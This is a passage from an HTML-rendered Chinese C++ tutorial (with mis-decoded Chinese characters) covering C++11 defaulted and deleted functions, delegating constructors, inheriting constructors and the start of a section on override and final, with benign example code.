class="keyword">default</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç¦ç”¨å¤åˆ¶æ„é€ å‡½æ•°</span></span><br><span class="line">    NonCopyable(<span class="keyword">const</span> NonCopyable&amp;) = <span class="keyword">delete</span>;</span><br><span class="line">    <span class="comment">// ç¦ç”¨å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦</span></span><br><span class="line">    NonCopyable&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> NonCopyable&amp;) = <span class="keyword">delete</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç§»åŠ¨æ“ä½œé€šå¸¸ä»å¯é»˜è®¤ç”Ÿæˆæˆ–æ˜¾å¼ default</span></span><br><span class="line">    NonCopyable(NonCopyable&amp;&amp;) = <span class="keyword">default</span>;</span><br><span class="line">    NonCopyable&amp; <span class="keyword">operator</span>=(NonCopyable&amp;&amp;) = <span class="keyword">default</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ResourceManager</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;<span class="keyword">int</span>&gt; ptr; <span class="comment">// unique_ptr æœ¬èº«æ˜¯ä¸å¯å¤åˆ¶çš„</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ResourceManager(<span class="keyword">int</span> val) : ptr(<span class="built_in">std</span>::make_unique&lt;<span class="keyword">int</span>&gt;(val)) &#123;&#125;</span><br><span class="line">    <span class="comment">// ç”±äº unique_ptr ä¸å¯å¤åˆ¶ï¼Œç¼–è¯‘å™¨ä¸ä¼šç”Ÿæˆé»˜è®¤çš„å¤åˆ¶æ“ä½œ</span></span><br><span class="line">    <span class="comment">// æˆ‘ä»¬å¯ä»¥æ˜¾å¼ç¦ç”¨å®ƒä»¬ï¼Œä½¿æ„å›¾æ›´æ˜ç¡®</span></span><br><span class="line">    ResourceManager(<span class="keyword">const</span> ResourceManager&amp;) = <span class="keyword">delete</span>;</span><br><span class="line">    ResourceManager&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> ResourceManager&amp;) = <span class="keyword">delete</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç§»åŠ¨æ“ä½œæ˜¯å…è®¸çš„ (unique_ptr å¯ç§»åŠ¨)</span></span><br><span class="line">    ResourceManager(ResourceManager&amp;&amp;) = <span class="keyword">default</span>;</span><br><span class="line">    ResourceManager&amp; <span class="keyword">operator</span>=(ResourceManager&amp;&amp;) = <span class="keyword">default</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é˜²æ­¢é€šè¿‡æ•´æ•°è¿›è¡Œéšå¼è½¬æ¢æ„é€ </span></span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">ResourceManager</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span>)</span> </span>= <span class="keyword">delete</span>; <span class="comment">// ç¦æ­¢ long long æ„é€ </span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    NonCopyable nc1;</span><br><span class="line">    <span class="comment">// NonCopyable nc2 = nc1; // ç¼–è¯‘é”™è¯¯ï¼å¤åˆ¶æ„é€ å‡½æ•°è¢«åˆ é™¤</span></span><br><span class="line">    <span class="comment">// NonCopyable nc3;</span></span><br><span class="line">    <span class="comment">// nc3 = nc1;          // ç¼–è¯‘é”™è¯¯ï¼å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦è¢«åˆ é™¤</span></span><br><span class="line"></span><br><span class="line">    <span class="function">ResourceManager <span class="title">rm1</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line">    <span class="comment">// ResourceManager rm2 = rm1; // ç¼–è¯‘é”™è¯¯ï¼</span></span><br><span class="line">    ResourceManager rm3 = <span class="built_in">std</span>::move(rm1); <span class="comment">// OKï¼Œç§»åŠ¨æ„é€ å‡½æ•°æ˜¯é»˜è®¤çš„</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ResourceManager rm4(100LL); // ç¼–è¯‘é”™è¯¯ï¼long long æ„é€ å‡½æ•°è¢«åˆ é™¤</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>= default</code> å’Œ <code>= delete</code> æé«˜äº†ä»£ç çš„æ¸…æ™°åº¦å’Œå¯¹ç±»è¡Œä¸ºçš„æ§åˆ¶åŠ›ã€‚</p></li></ul><h3 id="18-3-3-å§”æ‰˜æ„é€ å‡½æ•°"><a href="#18-3-3-å§”æ‰˜æ„é€ å‡½æ•°" class="headerlink" title="18.3.3 å§”æ‰˜æ„é€ å‡½æ•°"></a>18.3.3 å§”æ‰˜æ„é€ å‡½æ•°</h3><p>C++11 å…è®¸ä¸€ä¸ªæ„é€ å‡½æ•°è°ƒç”¨<strong>åŒä¸€ä¸ªç±»</strong>çš„å¦ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œè¿™ç§°ä¸º**å§”æ‰˜æ„é€ å‡½æ•° (Delegating Constructor)**ã€‚è¿™æœ‰åŠ©äºå‡å°‘æ„é€ å‡½æ•°ä¹‹é—´çš„ä»£ç é‡å¤ã€‚</p><ul><li>  è¢«å§”æ‰˜çš„æ„é€ å‡½æ•°ï¼ˆç›®æ ‡æ„é€ å‡½æ•°ï¼‰ä¼šå…ˆæ‰§è¡Œã€‚</li><li>  ç›®æ ‡æ„é€ å‡½æ•°æ‰§è¡Œå®Œæ¯•åï¼Œå§”æ‰˜æ„é€ å‡½æ•°å‡½æ•°ä½“å†…çš„ä»£ç ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰æ‰ä¼šæ‰§è¡Œã€‚</li><li>  å§”æ‰˜è°ƒç”¨å¿…é¡»å‡ºç°åœ¨æ„é€ å‡½æ•°çš„<strong>åˆå§‹åŒ–åˆ—è¡¨</strong>ä½ç½®ã€‚</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Report</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> title;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> content;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ç›®æ ‡æ„é€ å‡½æ•° (æ‰§è¡Œå®é™…åˆå§‹åŒ–)</span></span><br><span class="line">    Report(<span class="keyword">int</span> i, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; t, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; c)</span><br><span class="line">        : id(i), title(t), content(c) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Target constructor called (id=&quot;</span> &lt;&lt; id &lt;&lt; <span class="string">&quot;).\n&quot;</span>;</span><br><span class="line">        <span class="comment">// ... å¯èƒ½è¿˜æœ‰å…¶ä»–åˆå§‹åŒ–é€»è¾‘ ...</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å§”æ‰˜æ„é€ å‡½æ•° 1: æä¾›é»˜è®¤ content</span></span><br><span class="line">    Report(<span class="keyword">int</span> i, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; t)</span><br><span class="line">        : Report(i, t, <span class="string">&quot;Default Content&quot;</span>) &#123; <span class="comment">// å§”æ‰˜ç»™ä¸‰ä¸ªå‚æ•°çš„æ„é€ å‡½æ•°</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Delegating constructor 1 called.\n&quot;</span>;</span><br><span class="line">        <span class="comment">// è¿™é‡Œå¯ä»¥æ·»åŠ æ­¤æ„é€ å‡½æ•°ç‰¹æœ‰çš„é€»è¾‘</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å§”æ‰˜æ„é€ å‡½æ•° 2: æä¾›é»˜è®¤ title å’Œ content</span></span><br><span class="line">    Report(<span class="keyword">int</span> i)</span><br><span class="line">        : Report(i, <span class="string">&quot;Default Title&quot;</span>) &#123; <span class="comment">// å§”æ‰˜ç»™ä¸¤ä¸ªå‚æ•°çš„æ„é€ å‡½æ•°</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Delegating constructor 2 called.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å§”æ‰˜æ„é€ å‡½æ•° 3: æä¾›æ‰€æœ‰é»˜è®¤å€¼</span></span><br><span class="line">    Report()</span><br><span class="line">        : Report(<span class="number">0</span>) &#123; <span class="comment">// å§”æ‰˜ç»™ä¸€ä¸ªå‚æ•°çš„æ„é€ å‡½æ•°</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Delegating constructor 3 (default) called.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ID: &quot;</span> &lt;&lt; id &lt;&lt; <span class="string">&quot;, Title: &quot;</span> &lt;&lt; title &lt;&lt; <span class="string">&quot;, Content: &quot;</span> &lt;&lt; content &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Creating r1:\n&quot;</span>;</span><br><span class="line">    <span class="function">Report <span class="title">r1</span><span class="params">(<span class="number">101</span>, <span class="string">&quot;Monthly Report&quot;</span>, <span class="string">&quot;Details...&quot;</span>)</span></span>; <span class="comment">// è°ƒç”¨ç›®æ ‡æ„é€ </span></span><br><span class="line">    r1.print();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;------\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Creating r2:\n&quot;</span>;</span><br><span class="line">    <span class="function">Report <span class="title">r2</span><span class="params">(<span class="number">102</span>, <span class="string">&quot;Weekly Update&quot;</span>)</span></span>; <span class="comment">// è°ƒç”¨å§”æ‰˜æ„é€  1 -&gt; ç›®æ ‡æ„é€ </span></span><br><span class="line">    r2.print();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;------\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Creating r3:\n&quot;</span>;</span><br><span class="line">    <span class="function">Report <span class="title">r3</span><span class="params">(<span class="number">103</span>)</span></span>; <span class="comment">// è°ƒç”¨å§”æ‰˜æ„é€  2 -&gt; å§”æ‰˜æ„é€  1 -&gt; ç›®æ ‡æ„é€ </span></span><br><span class="line">    r3.print();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;------\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Creating r4:\n&quot;</span>;</span><br><span class="line">    Report r4; <span class="comment">// è°ƒç”¨å§”æ‰˜æ„é€  3 -&gt; å§”æ‰˜æ„é€  2 -&gt; å§”æ‰˜æ„é€  1 -&gt; ç›®æ ‡æ„é€ </span></span><br><span class="line">    r4.print();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;------\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å§”æ‰˜æ„é€ å‡½æ•°ä½¿å¾—åˆå§‹åŒ–é€»è¾‘å¯ä»¥é›†ä¸­åœ¨ä¸€ä¸ªæˆ–å°‘æ•°å‡ ä¸ªæ„é€ å‡½æ•°ä¸­ï¼Œå…¶ä»–æ„é€ å‡½æ•°åªéœ€æä¾›é»˜è®¤å€¼å¹¶å§”æ‰˜å³å¯ã€‚</p><h3 id="18-3-4-ç»§æ‰¿æ„é€ å‡½æ•°"><a href="#18-3-4-ç»§æ‰¿æ„é€ å‡½æ•°" class="headerlink" title="18.3.4 ç»§æ‰¿æ„é€ å‡½æ•°"></a>18.3.4 ç»§æ‰¿æ„é€ å‡½æ•°</h3><p>åœ¨ C++11 ä¹‹å‰ï¼Œå¦‚æœæ´¾ç”Ÿç±»æƒ³ä½¿ç”¨åŸºç±»çš„æ„é€ å‡½æ•°ï¼Œå®ƒå¿…é¡»åœ¨è‡ªå·±çš„æ„é€ å‡½æ•°åˆå§‹åŒ–åˆ—è¡¨ä¸­æ˜¾å¼è°ƒç”¨åŸºç±»æ„é€ å‡½æ•°ï¼Œå¹¶ä¸”ä¸ºæ¯ä¸ªéœ€è¦çš„åŸºç±»æ„é€ å‡½æ•°ç­¾åæä¾›ä¸€ä¸ªå¯¹åº”çš„æ´¾ç”Ÿç±»æ„é€ å‡½æ•°ã€‚</p><p>C++11 å…è®¸æ´¾ç”Ÿç±»ä½¿ç”¨ <code>using</code> å£°æ˜æ¥<strong>ç»§æ‰¿</strong>åŸºç±»çš„æ„é€ å‡½æ•°ï¼ˆä½†æœ‰ä¸€äº›ä¾‹å¤–ï¼Œå¦‚æ¶‰åŠè™šåŸºç±»çš„æ„é€ å‡½æ•°é€šå¸¸ä¸è¢«ç»§æ‰¿ï¼‰ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Base(<span class="keyword">int</span> v, <span class="built_in">std</span>::<span class="built_in">string</span> n) : value(v), name(n) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base(int, string) called.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Base(<span class="keyword">int</span> v) : Base(v, <span class="string">&quot;DefaultName&quot;</span>) &#123; <span class="comment">// ä½¿ç”¨å§”æ‰˜æ„é€ </span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base(int) called.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Base() : Base(<span class="number">0</span>) &#123; <span class="comment">// ä½¿ç”¨å§”æ‰˜æ„é€ </span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base() called.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base - Value: &quot;</span> &lt;&lt; value &lt;&lt; <span class="string">&quot;, Name: &quot;</span> &lt;&lt; name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Derived</span> :</span> <span class="keyword">public</span> Base &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">double</span> extra_data;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ç»§æ‰¿ Base çš„æ‰€æœ‰æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="keyword">using</span> Base::Base; <span class="comment">// ç¼–è¯‘å™¨ä¼šç”Ÿæˆå¯¹åº”çš„ Derived æ„é€ å‡½æ•°ï¼Œå®ƒä»¬è°ƒç”¨åŒ¹é…çš„ Base æ„é€ å‡½æ•°</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¯ä»¥æ·»åŠ æ–°çš„æ„é€ å‡½æ•°ï¼Œæˆ–è€…è¦†ç›–ç»§æ‰¿æ¥çš„æ„é€ å‡½æ•° (å¦‚æœç­¾åç›¸åŒ)</span></span><br><span class="line">    Derived(<span class="keyword">double</span> d) : Base(<span class="number">999</span>, <span class="string">&quot;Special&quot;</span>), extra_data(d) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Derived(double) called.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¦‚æœéœ€è¦å¯¹ç»§æ‰¿æ¥çš„æ„é€ å‡½æ•°æ·»åŠ é¢å¤–åˆå§‹åŒ–ï¼Œéœ€è¦æ˜¾å¼å®šä¹‰</span></span><br><span class="line">    <span class="comment">// ä¾‹å¦‚ï¼Œå¦‚æœæƒ³è®© Derived(int) åˆå§‹åŒ– extra_data</span></span><br><span class="line">    Derived(<span class="keyword">int</span> v) : Base(v), extra_data(<span class="number">0.0</span>) &#123; <span class="comment">// æ˜¾å¼è°ƒç”¨åŸºç±»æ„é€ å¹¶åˆå§‹åŒ–æˆå‘˜</span></span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Derived(int) explicitly defined.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">display_derived</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">        display(); <span class="comment">// è°ƒç”¨åŸºç±»çš„ display</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Derived - Extra Data: &quot;</span> &lt;&lt; extra_data &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Creating d1:\n&quot;</span>;</span><br><span class="line">    <span class="function">Derived <span class="title">d1</span><span class="params">(<span class="number">10</span>, <span class="string">&quot;Object1&quot;</span>)</span></span>; <span class="comment">// è°ƒç”¨ç»§æ‰¿æ¥çš„ Base(int, string) å¯¹åº”çš„æ„é€ å‡½æ•°</span></span><br><span class="line">    d1.display_derived();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;------\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Creating d2:\n&quot;</span>;</span><br><span class="line">    <span class="function">Derived <span class="title">d2</span><span class="params">(<span class="number">20</span>)</span></span>; <span class="comment">// è°ƒç”¨ Derived è‡ªå·±å®šä¹‰çš„ Derived(int) æ„é€ å‡½æ•°</span></span><br><span class="line">    d2.display_derived();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;------\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Creating d3:\n&quot;</span>;</span><br><span class="line">    Derived d3; <span class="comment">// è°ƒç”¨ç»§æ‰¿æ¥çš„ Base() å¯¹åº”çš„æ„é€ å‡½æ•°</span></span><br><span class="line">    d3.display_derived();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;------\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Creating d4:\n&quot;</span>;</span><br><span class="line">    <span class="function">Derived <span class="title">d4</span><span class="params">(<span class="number">3.14</span>)</span></span>; <span class="comment">// è°ƒç”¨ Derived è‡ªå·±å®šä¹‰çš„ Derived(double) æ„é€ å‡½æ•°</span></span><br><span class="line">    d4.display_derived();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;------\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»§æ‰¿æ„é€ å‡½æ•°ç®€åŒ–äº†æ´¾ç”Ÿç±»çš„ç¼–å†™ï¼Œç‰¹åˆ«æ˜¯å½“åŸºç±»æœ‰å¤šä¸ªæ„é€ å‡½æ•°æ—¶ï¼Œé¿å…äº†ç¼–å†™å¤§é‡ä»…ä»…æ˜¯è½¬å‘å‚æ•°çš„æ´¾ç”Ÿç±»æ„é€ å‡½æ•°ã€‚</p><h3 id="18-3-5-ç®¡ç†è™šæ–¹æ³•ï¼šoverride-å’Œ-final"><a href="#18-3-5-ç®¡ç†è™šæ–¹æ³•ï¼šoverride-å’Œ-final" class="headerlink" title="18.3.5 ç®¡ç†è™šæ–¹æ³•ï¼šoverride å’Œ final"></a>18.3.5 ç®¡ç†è™šæ–¹æ³•ï¼š<code>override</code> å’Œ <code>final</code></h3><p>C++11 æä¾›äº†ä¸¤ä¸ªæ–°çš„**ä¸Šä¸‹æ–‡å…³é”®å­— (Contextual Keywords)**ï¼ˆåªåœ¨ç‰¹å®šä½ç½®æœ‰ç‰¹æ®Šå«ä¹‰ï¼Œå…¶ä»–åœ°æ–¹å¯ç”¨ä½œæ ‡è¯†ç¬¦ï¼‰æ¥å¸®åŠ©ç®¡ç†ç±»ç»§æ‰¿ä½“ç³»ä¸­çš„è™šå‡½æ•°ï¼š<code>override</code> å’Œ <code>final</code>ã€‚</p><ul><li><p><strong><code>override</code>:</strong></p><ul><li>  æ˜¾å¼åœ°æ”¾åœ¨æ´¾ç”Ÿç±»ä¸­<strong>é‡å†™ (override)</strong> çš„è™šå‡½æ•°å£°æ˜æˆ–å®šä¹‰ä¹‹åã€‚</li><li>  ä½œç”¨ï¼šè®©ç¼–è¯‘å™¨æ£€æŸ¥è¯¥å‡½æ•°æ˜¯å¦<strong>ç¡®å®</strong>è¦†ç›–äº†åŸºç±»ä¸­çš„æŸä¸ªè™šå‡½æ•°ï¼ˆå‡½æ•°ç­¾åã€<code>const</code> é™å®šç¬¦ã€å¼•ç”¨é™å®šç¬¦å¿…é¡»å®Œå…¨åŒ¹é…ï¼‰ã€‚</li><li>  å¦‚æœæ´¾ç”Ÿç±»å‡½æ•°æ ‡è®°ä¸º <code>override</code> ä½†å¹¶æœªè¦†ç›–ä»»ä½•åŸºç±»è™šå‡½æ•°ï¼ˆä¾‹å¦‚å› ä¸ºæ‹¼å†™é”™è¯¯ã€å‚æ•°ç±»å‹ä¸åŒ¹é…ã€<code>const</code> ä¸åŒ¹é…ï¼‰ï¼Œç¼–è¯‘å™¨ä¼šæŠ¥é”™ã€‚</li><li>  è¿™æœ‰åŠ©äºé˜²æ­¢å› æ„å¤–ç­¾åä¸åŒ¹é…è€Œå¯¼è‡´çš„è¦†ç›–å¤±è´¥ï¼ˆå˜æˆéšè—æˆ–å®šä¹‰æ–°å‡½æ•°ï¼‰ã€‚</li></ul></li><li><p><strong><code>final</code> (ç”¨äºè™šå‡½æ•°):</strong></p><ul><li>  æ˜¾å¼åœ°æ”¾åœ¨æ´¾ç”Ÿç±»ä¸­<strong>é‡å†™</strong>çš„è™šå‡½æ•°å£°æ˜æˆ–å®šä¹‰ä¹‹åã€‚</li><li>  ä½œç”¨ï¼šé˜»æ­¢<strong>ä»»ä½•åç»­</strong>çš„æ´¾ç”Ÿç±»è¿›ä¸€æ­¥è¦†ç›–è¿™ä¸ªè™šå‡½æ•°ã€‚</li></ul></li><li><p><strong><code>final</code> (ç”¨äºç±»):</strong></p><ul><li>  æ”¾åœ¨ç±»å®šä¹‰çš„ <code>class</code> å…³é”®å­—ä¹‹åï¼Œç±»åä¹‹å‰æˆ–ä¹‹åã€‚</li><li>  ä½œç”¨ï¼šé˜»æ­¢è¯¥ç±»è¢«<strong>ä»»ä½•å…¶ä»–ç±»ç»§æ‰¿</strong>ã€‚</li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 